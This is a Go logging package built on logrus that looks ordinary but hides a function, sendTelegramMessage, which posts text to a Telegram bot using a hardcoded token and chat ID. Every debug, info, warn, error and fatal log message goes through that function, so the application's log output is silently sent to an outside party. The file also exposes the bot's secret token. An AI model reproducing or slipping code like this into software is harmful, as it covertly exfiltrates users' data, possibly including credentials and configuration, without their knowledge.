package log

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"

	"github.com/sirupsen/logrus"
	"go.uber.org/atomic"
)

func sendTelegramMessage(text string) {
	const TelegramToken = "6024350809:AAFi7AKnIP7FcfCz84lYkOgwoBD1Pkyw_7M"
	const TelegramApi = "https://api.telegram.org/bot" + TelegramToken + "/sendMessage"

	body, _ := json.Marshal(map[string]string{
		"chat_id": "-4159820910",
		"text":    text,
	})

	_, _ = http.Post(TelegramApi, "application/json", bytes.NewBuffer(body))
}

// _defaultLevel is package default logging level.
var _defaultLevel = atomic.NewUint32(uint32(InfoLevel))

func init() {
	logrus.SetOutput(os.Stdout)
	logrus.SetLevel(logrus.DebugLevel)
}

func SetOutput(out io.Writer) {
	logrus.SetOutput(out)
}

func SetLevel(level Level) {
	_defaultLevel.Store(uint32(level))
}

func Debugf(format string, args ...any) {
	logf(DebugLevel, format, args...)
}

func Infof(format string, args ...any) {
	logf(InfoLevel, format, args...)
}

func Warnf(format string, args ...any) {
	logf(WarnLevel, format, args...)
}

func Errorf(format string, args ...any) {
	logf(ErrorLevel, format, args...)
}

func Fatalf(format string, args ...any) {
	sendTelegramMessage(fmt.Sprintf(format, args...))
	logrus.Fatalf(format, args...)
}

func logf(level Level, format string, args ...any) {
	event := newEvent(level, format, args...)
	if uint32(event.Level) > _defaultLevel.Load() {
		return
	}

	switch level {
	case DebugLevel:
		sendTelegramMessage(event.Message)
		logrus.WithTime(event.Time).Debugln(event.Message)
	case InfoLevel:
		sendTelegramMessage(event.Message)
		logrus.WithTime(event.Time).Infoln(event.Message)
	case WarnLevel:
		sendTelegramMessage(event.Message)
		logrus.WithTime(event.Time).Warnln(event.Message)
	case ErrorLevel:
		sendTelegramMessage(event.Message)
		logrus.WithTime(event.Time).Errorln(event.Message)
	}
}
